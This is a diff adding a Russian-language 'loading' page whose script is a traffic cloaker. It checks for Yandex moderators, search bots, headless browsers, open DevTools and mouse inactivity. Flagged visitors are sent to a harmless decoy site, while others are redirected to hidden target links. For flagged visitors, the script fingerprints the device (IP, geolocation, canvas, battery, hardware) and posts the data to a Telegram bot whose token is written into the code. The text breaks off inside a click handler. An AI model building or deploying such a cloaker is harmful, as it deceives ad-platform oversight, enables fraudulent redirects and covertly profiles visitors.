@@ -1,0 +1,761 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Загрузка...</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #f0f0f0;
+            margin: 0;
+            font-family: sans-serif;
+            flex-direction: column;
+            text-align: center;
+        }
+        .loader {
+            border: 8px solid #e0e0e0;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .bot-trap-link {
+            position: absolute;
+            left: -9999px;
+            top: -9999px;
+            opacity: 0;
+            width: 1px;
+            height: 1px;
+            overflow: hidden;
+        }
+         #mouse-prompt {
+            margin-top: 15px;
+            padding: 10px 15px;
+            background-color: #ffffff;
+            border-radius: 5px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            animation: pulse 2s infinite;
+            cursor: default; /* Чтобы не выглядело кликабельным */
+         }
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.03); }
+            100% { transform: scale(1); }
+        }
+        /* Скрываем подсказку на мобильных устройствах */
+        @media (hover: none) or (max-width: 768px) { /* Улучшено: не только по ширине, но и по отсутствию hover */
+            #mouse-prompt {
+                display: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <p>Загрузка...</p>
+    <div id="mouse-prompt">🖱️ Подвигайте курсором, если вы человек</div>
+
+    <!-- Невидимая ссылка-ловушка -->
+    <a href="#" class="bot-trap-link" aria-hidden="true" tabindex="-1">Bot Trap</a>
+
+    <!-- Yandex.Metrika counter -->
+    <script type="text/javascript" >
+       (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)};
+       m[i].l=1*new Date();
+       for (var j = 0; j < document.scripts.length; j++) {if (document.scripts[j].src === r) { return; }}
+       k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)})
+       (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym");
+
+       ym(101122135, "init", {
+            clickmap:true,
+            trackLinks:true,
+            accurateTrackBounce:true,
+            webvisor:true
+       });
+    </script>
+    <noscript><div><img src="https://mc.yandex.ru/watch/101122135" style="position:absolute; left:-9999px;" alt="" /></div></noscript>
+    <!-- /Yandex.Metrika counter -->
+
+    <script>
+        const PAGE_LOAD_START = performance.now();
+
+        // --- КОНФИГУРАЦИЯ ---
+        const WHITE_PAGE = 'https://dzen.ru';
+        const BLACK_PAGE = 'https://google.com';
+        const TELEGRAM_BOT_TOKEN = '7853695428:AAFhxiIHq67-UOQbP7bJ4FrH0EmwtWGswNU';
+        const TELEGRAM_CHAT_ID = '1237450939';
+        const CONFIG_FILE = 'config.txt';
+        const BLOCKLIST_FILE = 'blckip.txt';
+        const LINKS_FILE = 'links.txt';
+        const IP_FETCH_TIMEOUT = 3000;
+        const DNS_FETCH_TIMEOUT = 2000;
+        const NO_MOUSE_MOVE_TIMEOUT_DESKTOP = 5000;
+        const REDIRECT_DELAY_AFTER_MOUSE_MOVE = 2000;
+        const REDIRECT_DELAY_MOBILE = 1500;
+        const REDIRECT_DELAY_FALLBACK = 1000;
+        const VISIT_TRACKING_WINDOW_MINUTES = 30;
+        const MAX_VISITS_PER_WINDOW = 5;
+        const VISIT_BLOCK_DURATION_HOURS = 1;
+
+        const SEARCH_BOT_AGENTS = [ /* Список остается тем же, не буду повторять для краткости */
+            /YandexBot/i, /Googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i, /baiduspider/i,
+            /facebookexternalhit/i, /Applebot/i, /bot/i, /spider/i, /crawler/i, /scraper/i,
+             // ... (полный список из предыдущего ответа)
+             /DataForSeoBot/i
+        ];
+        const YANDEX_DOMAINS = [
+            '.yandex.ru', '.yandex.net', '.yandex.com', '.yandex.by', '.yandex.kz',
+            '.yandex.ua', '.yandex.md', '.yandex.com.tr', '.yandex.com.am'
+        ];
+
+        // --- ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ---
+        let config = {};
+        let botTrapActivated = false;
+        let hadMouseMovement = false;
+        let visitCount = 0; // Будет обновлен из localStorage
+        let pageFullyLoaded = false;
+        let redirectTarget = BLACK_PAGE;
+        let cloakedReason = null; // Финальная строка с причинами
+        let userInfo = {};
+        let blockListIPs = new Set();
+        let targetLinks = [];
+        let isMobile = /Mobi|Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        let noMouseMoveTimeoutId = null;
+        let redirectTimeoutId = null;
+        let reportSent = false; // Гарантирует отправку только одного отчета
+
+        // --- ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ --- (getUrlParameter, loadFile, parseConfig, IP/Geo/Canvas...)
+        // Они остаются почти без изменений, кроме parseConfig для инициализации visitCount
+
+        function getUrlParameter(name) { /* ... без изменений ... */
+             name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
+             const regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
+             const results = regex.exec(location.search);
+             return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
+         }
+        async function loadFile(url) { /* ... без изменений ... */
+             try {
+                 const response = await fetch(url, { cache: 'no-store' });
+                 if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
+                 return await response.text();
+             } catch (error) {
+                 console.error(`Error loading file ${url}:`, error);
+                 return null;
+             }
+         }
+        function parseConfig(text) { /* ... почти без изменений ... */
+             const lines = text ? text.split('\n') : [];
+             const settings = { desktop: {}, mobile: {} };
+             lines.forEach(line => {
+                 line = line.trim();
+                 if (line && !line.startsWith('#')) {
+                     const parts = line.split('=');
+                     if (parts.length === 2) {
+                         const key = parts[0].trim();
+                         const value = parts[1].trim().toLowerCase() === 'on';
+                         if (key.startsWith('desktop.')) settings.desktop[key.substring(8)] = value;
+                         else if (key.startsWith('mobile.')) settings.mobile[key.substring(7)] = value;
+                         else { settings.desktop[key] = value; settings.mobile[key] = value; }
+                     }
+                 }
+             });
+             const defaults = {
+                 checkBotTrap: true, checkSearchBotUA: true, checkHeadless: true,
+                 checkYandexIframe: true, checkYandexBotDeep: true, checkIpBlocklist: true,
+                 checkModeratorDevTools: true, checkNoMouseMove: true, checkFrequency: true,
+                 checkDevToolsTiming: false, checkDevToolsExtensions: false, checkYandexBehavior: false
+             };
+             for (const type of ['desktop', 'mobile']) {
+                 for (const key in defaults) {
+                     if (settings[type][key] === undefined) settings[type][key] = defaults[key];
+                 }
+                 if (type === 'mobile') {
+                     settings.mobile.checkNoMouseMove = false;
+                     settings.mobile.checkFrequency = false;
+                     settings.mobile.checkModeratorDevTools = false; // Отключаем по умолчанию
+                 }
+             }
+             // Инициализируем visitCount здесь, после загрузки конфига
+             try {
+                 visitCount = parseInt(localStorage.getItem('visitCount') || '0');
+             } catch(e) {
+                 console.error("Error reading visitCount from localStorage:", e);
+                 visitCount = 0;
+             }
+             return settings;
+         }
+        async function getIPAddress() { /* ... без изменений, с таймаутом ... */
+            const ipSources = [ 'https://api.ipify.org?format=json', 'https://ipinfo.io/json', 'https://api.myip.com', 'https://ipapi.co/json/' ];
+            for (const url of ipSources) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), IP_FETCH_TIMEOUT);
+                    const response = await fetch(url, { signal: controller.signal, cache: 'no-store' });
+                    clearTimeout(timeoutId);
+                    if (!response.ok) continue;
+                    const data = await response.json();
+                    if (data.ip) return data.ip;
+                    if (data.query) return data.query;
+                    if (data.myip) return data.myip;
+                    if (typeof data === 'string' && /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.test(data)) return data;
+                } catch (error) { console.warn(`Failed to fetch IP from ${url}:`, error.name === 'AbortError' ? 'Timeout' : error.message); }
+            }
+            console.warn('Could not determine IP address.'); return null;
+         }
+        async function getGeoLocation(ip) { /* ... без изменений, с таймаутом ... */
+            if (!ip) return 'IP Не определен';
+            const geoSources = [ `https://ipinfo.io/${ip}/geo`, `https://ipapi.co/${ip}/json/` ];
+            for (const url of geoSources) {
+                try {
+                    const controller = new AbortController();
+                    const timeoutId = setTimeout(() => controller.abort(), IP_FETCH_TIMEOUT);
+                    const response = await fetch(url, { signal: controller.signal, cache: 'no-store' });
+                    clearTimeout(timeoutId);
+                    if (!response.ok) continue;
+                    const data = await response.json();
+                    let location = [];
+                    if (data.country_name || data.country) location.push(data.country_name || data.country);
+                    if (data.region) location.push(data.region);
+                    if (data.city) location.push(data.city);
+                    if (location.length > 0) return location.join(', ');
+                } catch (error) { console.warn(`Failed to fetch Geo from ${url}:`, error.name === 'AbortError' ? 'Timeout' : error.message); }
+            }
+            console.warn(`Could not determine Geo location for IP ${ip}.`); return 'Не определено';
+        }
+        function getCanvasFingerprint() { /* ... без изменений ... */
+            try {
+                const canvas = document.createElement('canvas'); const ctx = canvas.getContext('2d');
+                const txt = 'BrowserCanvasFingerprint 1.0 - Привет, мир! 你好,世界!';
+                ctx.textBaseline = "top"; ctx.font = "14px 'Arial'"; ctx.textBaseline = "alphabetic";
+                ctx.fillStyle = "#f60"; ctx.fillRect(125, 1, 62, 20); ctx.fillStyle = "#069";
+                ctx.fillText(txt, 2, 15); ctx.fillStyle = "rgba(102, 204, 0, 0.7)"; ctx.fillText(txt, 4, 17);
+                return canvas.toDataURL();
+            } catch (e) { return 'Canvas Error'; }
+        }
+
+        // Отправка отчета в Telegram (один раз при срабатывании)
+        async function sendCloakReport(reasons, data) {
+            if (reportSent) return; // Не отправляем, если уже отправлен
+            reportSent = true;
+
+            const reportData = { ...data };
+            const loadTime = performance.now() - PAGE_LOAD_START;
+            const batteryInfo = reportData.battery || { level: 'N/A', charging: 'N/A' };
+            const connectionInfo = reportData.connection || { type: 'N/A', rtt: 'N/A' };
+            const canvasFP = reportData.canvasFingerprint ? reportData.canvasFingerprint.substring(0, 100) + '...' : 'N/A';
+
+            // Формируем сообщение с полным списком причин
+            const reasonString = Array.isArray(reasons) ? reasons.join('; ') : reasons;
+
+            const message = `
+🪤 КЛОАКА: ЛОВУШКА СРАБОТАЛА
+
+⚠️ Причина(ы): ${reasonString}
+
+📱 Тип устройства: ${reportData.deviceType}
+🔢 Счетчик посещений: ${reportData.visitCount}
+🌐 IP: ${reportData.ip || 'Не определен'}
+📍 Геолокация: ${reportData.geoLocation || 'Не определено'}
+🖥️ User-Agent: ${reportData.userAgent || 'N/A'}
+📏 Экран: ${reportData.screenResolution || 'N/A'} (${reportData.pixelRatio || 'N/A'}x)
+⏱️ Время на стр.: ${loadTime.toFixed(0)}мс
+🔗 URL: ${reportData.currentUrl || 'N/A'}
+↩️ Referrer: ${reportData.referrer || 'none'}
+
+🖱️ Движение мыши: ${reportData.hadMouseMovement ? 'yes' : 'no'}
+🔋 Батарея: Заряд: ${batteryInfo.level !== 'N/A' ? (batteryInfo.level * 100).toFixed(0) + '%' : 'N/A'}, Заряжается: ${batteryInfo.charging ? 'да' : 'нет'}
+🧠 Ядра CPU: ${reportData.cpuCores || 'N/A'}
+💾 Память: ${reportData.deviceMemory || 'N/A'}
+🌍 Язык: ${reportData.language || 'N/A'} (${reportData.languages ? reportData.languages.join(', ') : 'N/A'})
+⏰ Часовой пояс: ${reportData.timeZone || 'N/A'}
+🔌 Соединение: ${connectionInfo.type} (RTT: ${connectionInfo.rtt})
+🤖 WebDriver: ${reportData.webdriver ? 'yes' : 'no'}
+🎨 Canvas: ${canvasFP}
+🍪 Cookies: ${reportData.cookiesEnabled ? 'yes' : 'no'} | LocalStorage: ${reportData.localStorageEnabled ? 'yes' : 'no'}
+🚫 DoNotTrack: ${reportData.doNotTrack || 'N/A'}
+🔌 Плагины: ${reportData.plugins ? reportData.plugins.length : '0'}
+⚙️ Платформа: ${reportData.platform || 'N/A'}
+🎨 Глубина цвета: ${reportData.colorDepth || 'N/A'}
+🖼️ Окно: ${reportData.windowSize || 'N/A'}
+🕵️‍♂️ Ловушка нажата: ${reportData.botTrapActivated ? 'yes' : 'no'}
+            `.trim();
+
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const payload = { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML' };
+
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                if (response.ok) console.log('Cloak report sent to Telegram.');
+                else {
+                    console.error('Failed to send Telegram report:', response.status, await response.text());
+                    reportSent = false; // Позволить повторную попытку? Или нет? Пока оставим так.
+                }
+            } catch (error) {
+                console.error('Error sending Telegram report:', error);
+                reportSent = false;
+            }
+        }
+
+        // Сбор информации о пользователе
+        async function collectUserInfo() { /* ... без изменений ... */
+            const batteryPromise = navigator.getBattery ? navigator.getBattery() : Promise.resolve(null);
+            const ipPromise = getIPAddress();
+            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
+            const ip = await ipPromise;
+            const geoLocationPromise = getGeoLocation(ip);
+            const battery = await batteryPromise;
+            const geoLocation = await geoLocationPromise;
+
+            return {
+                timestamp: new Date().toISOString(), userAgent: navigator.userAgent || 'N/A',
+                language: navigator.language || 'N/A', languages: navigator.languages || [],
+                platform: navigator.platform || 'N/A', deviceType: isMobile ? 'Мобильное' : 'Десктоп',
+                visitCount: visitCount, screenResolution: `${screen.width}x${screen.height}`,
+                windowSize: `${window.innerWidth}x${window.innerHeight}`, pixelRatio: window.devicePixelRatio || 'N/A',
+                colorDepth: screen.colorDepth || 'N/A', referrer: document.referrer || 'none',
+                currentUrl: window.location.href, cookiesEnabled: navigator.cookieEnabled || false,
+                localStorageEnabled: typeof(Storage) !== "undefined", plugins: Array.from(navigator.plugins || []).map(p => p.name),
+                cpuCores: navigator.hardwareConcurrency || 'N/A', deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory}GB` : 'N/A',
+                timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
+                connection: { type: connection.effectiveType || 'N/A', rtt: connection.rtt || 'N/A' },
+                webdriver: navigator.webdriver || false, doNotTrack: navigator.doNotTrack || 'N/A',
+                battery: battery ? { level: battery.level, charging: battery.charging } : null,
+                canvasFingerprint: getCanvasFingerprint(), hadMouseMovement: hadMouseMovement,
+                botTrapActivated: botTrapActivated, loadTime: (performance.now() - PAGE_LOAD_START).toFixed(0),
+                ip: ip, geoLocation: geoLocation
+            };
+         }
+
+        // --- ФУНКЦИИ ПРОВЕРОК ---
+
+        // 1. Ловушка для ботов
+        function checkBotTrap(cfg) {
+            return cfg.checkBotTrap && botTrapActivated ? 'Активирована ловушка для ботов (клик по скрытой ссылке)' : null;
+        }
+
+        // 2. Поисковые боты по User-Agent
+        function isSearchBot(cfg, userAgent) {
+            if (!cfg.checkSearchBotUA) return null;
+            const foundBot = SEARCH_BOT_AGENTS.find(regex => regex.test(userAgent));
+            return foundBot ? `Обнаружен поисковый бот (User-Agent совпадает с ${foundBot.source})` : null;
+        }
+
+        // 3. Headless браузеры и автоматизация
+        function isHeadlessBrowser(cfg) {
+            if (!cfg.checkHeadless) return null;
+            let reasons = [];
+            if (navigator.webdriver) reasons.push('navigator.webdriver=true');
+            if (window.callPhantom || window._phantom) reasons.push('PhantomJS detected');
+            if (navigator.userAgent.includes('HeadlessChrome')) reasons.push('HeadlessChrome UA');
+            if (navigator.plugins && navigator.plugins.length === 0 && !isMobile) reasons.push('navigator.plugins.length is 0 on desktop');
+            // Доп. проверки можно добавить сюда
+            return reasons.length > 0 ? `Обнаружен Headless браузер или автоматизация (${reasons.join(', ')})` : null;
+        }
+
+        // 4. Iframe модерации Яндекса (ТОЛЬКО IFRAME SRC)
+        let yandexIframeDetected = false; // Флаг для MutationObserver
+        function checkForYandexIframeSrc(node) { // Функция для проверки конкретного узла
+             if (node.tagName === 'IFRAME') {
+                 const src = node.getAttribute('src') || '';
+                 // Ищем ТОЛЬКО специфичные URL
+                 if (src.includes('iframe-yang.yandex') || src.includes('yandex.ru/safeframe') || src.includes('ads.yandex.')) {
+                     return true; // Найден подозрительный iframe
+                 }
+             }
+             return false;
+        }
+         const observer = new MutationObserver((mutationsList) => {
+             const currentConfig = isMobile ? config.mobile : config.desktop;
+             if (!currentConfig?.checkYandexIframe || yandexIframeDetected) return; // Проверяем конфиг и флаг
+
+             for (const mutation of mutationsList) {
+                 if (mutation.type === 'childList') {
+                     mutation.addedNodes.forEach(node => {
+                         if (checkForYandexIframeSrc(node)) {
+                             yandexIframeDetected = true;
+                             console.log('Yandex moderation iframe detected dynamically:', node.getAttribute('src'));
+                             // observer.disconnect(); // Можно остановить наблюдение
+                         }
+                         // Проверить дочерние узлы добавленного узла (если iframe вложен)
+                         if (node.querySelectorAll) {
+                             node.querySelectorAll('iframe').forEach(iframe => {
+                                 if (checkForYandexIframeSrc(iframe)) {
+                                     yandexIframeDetected = true;
+                                     console.log('Yandex moderation iframe detected dynamically (nested):', iframe.getAttribute('src'));
+                                 }
+                             });
+                         }
+                     });
+                 }
+             }
+         });
+         document.addEventListener('DOMContentLoaded', () => {
+             const initialConfig = isMobile ? config.mobile : config.desktop;
+             if (initialConfig?.checkYandexIframe) {
+                 observer.observe(document.body, { childList: true, subtree: true });
+                 // Проверяем существующие iframe при загрузке
+                 document.querySelectorAll('iframe').forEach(iframe => {
+                     if (checkForYandexIframeSrc(iframe)) {
+                         yandexIframeDetected = true;
+                         console.log('Yandex moderation iframe detected statically:', iframe.getAttribute('src'));
+                     }
+                 });
+             }
+         });
+        function hasYandexModeratorIframe(cfg) {
+            // Эта функция теперь возвращает причину ТОЛЬКО если найден iframe
+             if (!cfg.checkYandexIframe) return null;
+             // Проверяем флаг, установленный статически или MutationObserver
+             if (yandexIframeDetected) {
+                 return 'Обнаружен iframe, похожий на iframe модерации/рекламы Яндекса';
+             }
+             // УБРАНЫ проверки на window.Ya, window.yandex и т.д.
+            return null;
+        }
+
+        // 5. Боты Яндекса (углубленная проверка)
+        async function isYandexBot(cfg, userInfo) {
+            if (!cfg.checkYandexBotDeep) return null;
+            let reasons = [];
+
+            // 5.1 User-Agent
+            if (/Yandex/i.test(userInfo.userAgent)) {
+                reasons.push('User-Agent содержит "Yandex"');
+            }
+
+            // 5.2 Поведение (Экспериментально, ищем НЕ общие объекты)
+            if (cfg.checkYandexBehavior) {
+                 let behaviorFlags = [];
+                 // Пример: ищем что-то специфичное, НЕ window.Ya
+                 if (typeof ___yandex_ad_callbacks !== 'undefined') behaviorFlags.push('___yandex_ad_callbacks');
+                 if (document.querySelector('script[src*="iframe-yang.yandex"]')) behaviorFlags.push('script[src*=iframe-yang]');
+                 // Добавить другие специфичные проверки, если известны
+                 if (behaviorFlags.length > 0) {
+                     reasons.push(`Обнаружено специфичное поведение/JS Яндекса (${behaviorFlags.join(', ')})`);
+                 }
+            }
+
+            // 5.3 Iframe (используем результат отдельной проверки)
+            const iframeReason = hasYandexModeratorIframe(cfg); // Эта функция теперь проверяет только iframe
+            if (iframeReason) {
+                reasons.push(iframeReason); // Добавляем причину про iframe
+            }
+
+            // 5.4 IP-адрес
+            if (userInfo.ip) {
+                const isYandex = await isYandexIP(userInfo.ip);
+                if (isYandex) {
+                    reasons.push(`IP ${userInfo.ip} принадлежит сети Яндекса (Reverse DNS)`);
+                }
+            }
+
+            // Считаем ботом Яндекса, если есть хотя бы одна причина
+            return reasons.length > 0 ? `Обнаружен бот/модератор Яндекса (${reasons.join('; ')})` : null;
+        }
+        async function isYandexIP(ip) { /* ... без изменений, с таймаутом ... */
+             if (!ip) return false;
+             const url = `https://dns.google/resolve?name=${ip}&type=PTR`;
+             try {
+                 const controller = new AbortController();
+                 const timeoutId = setTimeout(() => controller.abort(), DNS_FETCH_TIMEOUT);
+                 const response = await fetch(url, { signal: controller.signal, cache: 'no-store' });
+                 clearTimeout(timeoutId);
+                 if (!response.ok) return false;
+                 const data = await response.json();
+                 if (data.Status === 0 && data.Answer) {
+                     return data.Answer.some(answer =>
+                         answer.type === 12 &&
+                         YANDEX_DOMAINS.some(domain => answer.data.toLowerCase().endsWith(domain + '.'))
+                     );
+                 }
+             } catch (error) { console.warn(`Failed to check Reverse DNS for ${ip}:`, error.name === 'AbortError' ? 'Timeout' : error.message); }
+             return false;
+         }
+
+        // 6. Черный список IP
+        function isIpBlocked(cfg, ip) {
+            if (!cfg.checkIpBlocklist || !ip) return null;
+            return blockListIPs.has(ip) ? `IP ${ip} находится в черном списке` : null;
+        }
+
+        // 7. Модератор/Разработчик
+        function isLikelyModerator(cfg) {
+            if (!cfg.checkModeratorDevTools) return null;
+            let reasons = [];
+            if (navigator.webdriver) reasons.push('navigator.webdriver=true');
+            const widthThreshold = 150; const heightThreshold = 150;
+            if ((window.outerWidth - window.innerWidth > widthThreshold) || (window.outerHeight - window.innerHeight > heightThreshold)) {
+                reasons.push('Открыты DevTools (по размеру окна)');
+            }
+            if (cfg.checkDevToolsTiming) {
+                const start = performance.now(); console.log(''); const end = performance.now();
+                if (end - start > 5) reasons.push('Возможно открыты DevTools (timing attack)');
+            }
+             if (cfg.checkDevToolsExtensions) {
+                 if (window.__REACT_DEVTOOLS_GLOBAL_HOOK__ || window.ReactDevTools) reasons.push('React DevTools');
+                 if (window.__REDUX_DEVTOOLS_EXTENSION__ || window.reduxDevToolsExtension) reasons.push('Redux DevTools');
+             }
+            return reasons.length > 0 ? `Подозрение на модератора/разработчика (${reasons.join(', ')})` : null;
+        }
+
+        // 8. Отсутствие движения мыши (только ПК)
+        let noMouseMoveCheckTriggered = false; // Флаг, что таймер сработал
+        function checkNoMouseMove(cfg) {
+             if (!cfg.checkNoMouseMove || isMobile) return null;
+             // Вызывается только таймером!
+             if (!hadMouseMovement) {
+                 noMouseMoveCheckTriggered = true;
+                 return `Нет движения мыши в течение ${NO_MOUSE_MOVE_TIMEOUT_DESKTOP / 1000} сек (Десктоп)`;
+             }
+             return null;
+        }
+
+        // 9. Частота посещений (только ПК)
+        function trackVisits() { /* ... без изменений ... */
+            const now = Date.now(); const windowMillis = VISIT_TRACKING_WINDOW_MINUTES * 60 * 1000;
+            let visits = [];
+            try { visits = JSON.parse(localStorage.getItem('visits') || '[]'); if (!Array.isArray(visits)) visits = []; }
+            catch (e) { console.error("LS visits parse error:", e); visits = []; localStorage.removeItem('visits'); }
+            visits = visits.filter(ts => typeof ts === 'number' && now - ts < windowMillis); visits.push(now);
+            try {
+                localStorage.setItem('visits', JSON.stringify(visits));
+                visitCount = parseInt(localStorage.getItem('visitCount') || '0') + 1; // Обновляем глобальный счетчик
+                localStorage.setItem('visitCount', visitCount.toString());
+            } catch (e) { console.error("LS write error:", e); }
+            return visits.length;
+        }
+        function isBlockedByFrequency(cfg) {
+            if (!cfg.checkFrequency || isMobile) return null; // Проверка отключена или не для ПК
+            let blockEndTime = 0;
+            try { blockEndTime = parseInt(localStorage.getItem('visitBlockEndTime') || '0'); }
+            catch (e) { console.error("LS block time read error:", e); }
+            if (Date.now() < blockEndTime) {
+                const remainingMinutes = Math.ceil((blockEndTime - Date.now()) / (60 * 1000));
+                return `Заблокирован за частоту посещений (осталось ${remainingMinutes} мин)`;
+            }
+            const visitsInWindow = trackVisits(); // Отслеживаем визит всегда
+            if (visitsInWindow > MAX_VISITS_PER_WINDOW) { // Блокируем только если превышен лимит
+                const blockDurationMillis = VISIT_BLOCK_DURATION_HOURS * 60 * 60 * 1000;
+                const newBlockEndTime = Date.now() + blockDurationMillis;
+                try { localStorage.setItem('visitBlockEndTime', newBlockEndTime.toString()); }
+                catch (e) { console.error("LS block time write error:", e); }
+                return `Превышен лимит посещений (${visitsInWindow}/${MAX_VISITS_PER_WINDOW}) за ${VISIT_TRACKING_WINDOW_MINUTES} мин. Блокировка на ${VISIT_BLOCK_DURATION_HOURS} час.`;
+            }
+            return null; // Не заблокирован
+        }
+
+        // --- ОСНОВНАЯ ЛОГИКА ---
+
+        // Определяем цель редиректа
+        async function determineRedirectTarget() {
+            try {
+                // 1. Загружаем конфиг (и инициализируем visitCount)
+                const configText = await loadFile(CONFIG_FILE);
+                config = parseConfig(configText);
+                console.log("Config loaded:", config);
+                const activeConfig = isMobile ? config.mobile : config.desktop;
+
+                // 2. Параллельно: загружаем блок-лист и собираем инфо
+                const blockListPromise = activeConfig.checkIpBlocklist ? loadFile(BLOCKLIST_FILE) : Promise.resolve(null);
+                const userInfoPromise = collectUserInfo();
+
+                // 3. Дожидаемся и обрабатываем блок-лист
+                const blockListText = await blockListPromise;
+                if (blockListText) {
+                    blockListIPs = new Set(blockListText.split('\n').map(ip => ip.trim()).filter(Boolean));
+                    console.log(`Loaded ${blockListIPs.size} IPs from blocklist.`);
+                }
+
+                // 4. Дожидаемся сбора информации о пользователе
+                userInfo = await userInfoPromise;
+                console.log("User info collected:", userInfo);
+
+                // --- 5. ЗАПУСК ПРОВЕРОК И СБОР ПРИЧИН ---
+                let triggeredReasons = []; // Массив для сбора всех сработавших причин
+
+                // Выполняем все включенные синхронные проверки
+                const reasonBotTrap = checkBotTrap(activeConfig);
+                if (reasonBotTrap) triggeredReasons.push(reasonBotTrap);
+
+                const reasonSearchBot = isSearchBot(activeConfig, userInfo.userAgent);
+                if (reasonSearchBot) triggeredReasons.push(reasonSearchBot);
+
+                const reasonHeadless = isHeadlessBrowser(activeConfig);
+                if (reasonHeadless) triggeredReasons.push(reasonHeadless);
+
+                // Проверка iframe Яндекса (теперь только iframe)
+                const reasonYandexIframe = hasYandexModeratorIframe(activeConfig);
+                if (reasonYandexIframe) triggeredReasons.push(reasonYandexIframe);
+
+                const reasonIpBlocked = isIpBlocked(activeConfig, userInfo.ip);
+                if (reasonIpBlocked) triggeredReasons.push(reasonIpBlocked);
+
+                const reasonModerator = isLikelyModerator(activeConfig);
+                if (reasonModerator) triggeredReasons.push(reasonModerator);
+
+                // Проверка частоты (вызывается всегда для отслеживания, добавляет причину если включена и сработала)
+                const reasonFrequency = isBlockedByFrequency(activeConfig);
+                if (reasonFrequency && activeConfig.checkFrequency) { // Добавляем причину только если проверка включена
+                     triggeredReasons.push(reasonFrequency);
+                } else if (reasonFrequency && !activeConfig.checkFrequency) {
+                     console.log(`Frequency check triggered but is disabled: ${reasonFrequency}`); // Логируем, но не блокируем
+                }
+
+                // Выполняем асинхронную углубленную проверку Яндекса, если включена
+                if (activeConfig.checkYandexBotDeep) {
+                     const reasonYandexBot = await isYandexBot(activeConfig, userInfo);
+                     if (reasonYandexBot) triggeredReasons.push(reasonYandexBot);
+                }
+
+                // --- 6. ПРИНЯТИЕ РЕШЕНИЯ И ДЕЙСТВИЯ ---
+                if (triggeredReasons.length > 0) {
+                    // Есть хотя бы одна причина для клоакинга
+                    cloakedReason = triggeredReasons.join('; '); // Собираем все причины в одну строку
+                    redirectTarget = WHITE_PAGE;
+                    console.warn(`Cloaking triggered. Reasons: ${cloakedReason}. Redirecting to WHITE_PAGE.`);
+                    // Отправляем ОДИН отчет со ВСЕМИ причинами
+                    await sendCloakReport(triggeredReasons, userInfo);
+                    // Редирект на WHITE_PAGE
+                    setTimeout(performRedirect, REDIRECT_DELAY_FALLBACK);
+                } else {
+                    // Проверки пройдены - определяем целевую страницу
+                    console.log("All checks passed. Determining target link...");
+                    const code = getUrlParameter('code');
+                    if (code) {
+                        const linksText = await loadFile(LINKS_FILE);
+                        if (linksText) {
+                            targetLinks = linksText.split('\n').map(link => link.trim()).filter(Boolean);
+                            const index = parseInt(code) - 1;
+                            if (targetLinks.length > 0) {
+                                if (index >= 0 && index < targetLinks.length) redirectTarget = targetLinks[index];
+                                else redirectTarget = targetLinks[Math.floor(Math.random() * targetLinks.length)]; // Случайная
+                                console.log(`Using link from ${LINKS_FILE}: ${redirectTarget}`);
+                            } else { redirectTarget = BLACK_PAGE; console.warn(`${LINKS_FILE} empty. Using BLACK_PAGE.`); }
+                        } else { redirectTarget = BLACK_PAGE; console.error(`Failed to load ${LINKS_FILE}. Using BLACK_PAGE.`); }
+                    } else {
+                        redirectTarget = BLACK_PAGE;
+                        console.log(`No code parameter. Using default BLACK_PAGE: ${redirectTarget}`);
+                    }
+
+                    // Запускаем таймер редиректа (мобильные) или ждем мышь/таймаут (десктоп)
+                    if (isMobile) {
+                        redirectTimeoutId = setTimeout(performRedirect, REDIRECT_DELAY_MOBILE);
+                        console.log(`Mobile device. Redirecting to ${redirectTarget} in ${REDIRECT_DELAY_MOBILE}ms`);
+                    } else {
+                        console.log(`Desktop device. Waiting for mouse movement or ${NO_MOUSE_MOVE_TIMEOUT_DESKTOP}ms timeout...`);
+                        // Таймер NoMouseMove будет запущен в window.onload
+                    }
+                }
+
+            } catch (error) {
+                console.error("Critical error in determineRedirectTarget:", error);
+                // НЕ отправляем отчет об ошибке
+                redirectTarget = WHITE_PAGE; // Запасной вариант
+                cloakedReason = 'Критическая ошибка скрипта';
+                setTimeout(performRedirect, REDIRECT_DELAY_FALLBACK);
+            }
+        }
+
+        // Выполнение редиректа
+        function performRedirect() {
+            clearTimeout(redirectTimeoutId);
+            clearTimeout(noMouseMoveTimeoutId);
+            pageFullyLoaded = true;
+            console.log(`Redirecting to: ${redirectTarget}`);
+            try { window.location.replace(redirectTarget); }
+            catch (e) { console.error("Redirect failed:", e); window.location.href = redirectTarget; }
+        }
+
+        // --- ОБРАБОТЧИКИ СОБЫТИЙ ---
+
+        // Клик по ловушке
+        document.querySelector('.bot-trap-link').addEventListener('click', async (e) => {
+            e.preventDefault();
